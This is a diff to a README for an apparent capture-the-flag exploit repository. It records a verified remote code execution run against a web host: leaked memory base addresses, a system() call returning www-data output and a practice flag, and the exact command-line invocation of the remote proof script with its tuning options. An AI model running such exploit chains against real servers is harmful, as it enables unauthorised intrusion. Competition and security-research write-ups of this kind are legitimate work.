@@ -21,6 +21,31 @@ The current implementation has three recorded local results:
 200 response containing two random nonce markers, `id` output, and the output
 of `print-flag`.
 
+## Verified result on the CTF
+
+The bounded chain was executed against `https://old.stealmybitcoin.com` from a
+direct-network GitHub runner on 27 October 2026. The runner checked out commit
+`b021188198c73b39f7dfee33b56fdc00234e0e65`. Attempt 1 stopped on a validated
+HTTP 400 at B1. Attempt 2 completed all six stages, recovered both address
+bases, invoked `system()`, and returned the real remote `print-flag` output:
+
+```text
+attempt=2 statuses=200/200/200/200/200/200
+main=0x7fd5eee00000 php=0x55ee2e200000 zif_system=0x55ee2e70dd70
+response=uid=82(www-data) gid=82(www-data) groups=82(www-data)
+practice{challenge_already_won}
+RESULT=REMOTE_RCE_CONFIRMED
+```
+
+The exact command, commit, addresses, result, uploaded-artifact digest, and run
+links are preserved in [`remote-proof-success.log`](remote-proof-success.log).
+The complete public execution is GitHub Actions run
+[`40428614981`](https://github.com/Erwann9875/stealmybitcoin-ctf-attempt/actions/runs/40428614981).
+The `practice{challenge_already_won}` value is what `print-flag` returned after
+the original wallet had already been claimed; the independently validated
+`www-data` command callback proves remote code execution inside the PHP
+container.
+
 ## Research provenance
 
 The payload implementation in this repository predates the comparison with
@@ -98,6 +123,7 @@ direct route is available. The manual GitHub workflow uses that mode.
 | `local_proof.py` | Original restart-based single-worker proof. |
 | `remote_proof.py` | Persistent multi-worker and remote proof runner. |
 | `restart_proof.py` | Restart-assisted proof for an already hot supervised worker. |
+| `remote-proof-success.log` | Durable transcript and GitHub metadata for the verified remote run. |
 | `.github/workflows/remote-proof.yml` | Manually dispatched direct-network proof run. |
 
 The Python source contains no explanatory comments or docstrings. The protocol
@@ -240,6 +266,26 @@ attempt it saves:
   verified command output, and `RESULT=REMOTE_RCE_CONFIRMED`.
 
 Both files are ignored by Git until deliberately reviewed and added.
+
+The verified run used this exact invocation from the workflow:
+
+```bash
+python3 remote_proof.py \
+  --direct \
+  --attempts 4 \
+  --timeout 20 \
+  --retry-delay 5 \
+  --leak-length 0x440 \
+  --pre-parameters 8 \
+  --b1-fillers 5 \
+  --worker-stride 1
+```
+
+It succeeded on attempt 2. The direct route mattered: replaying the same
+bounded chain through an HTTPS interception proxy produced HTTP 400 and 502 at
+B1 because the proxy independently assigned requests upstream. No
+restart-assisted or `0x4000` terminating request was used in the successful
+remote run.
 
 The equivalent manual GitHub run is:
 
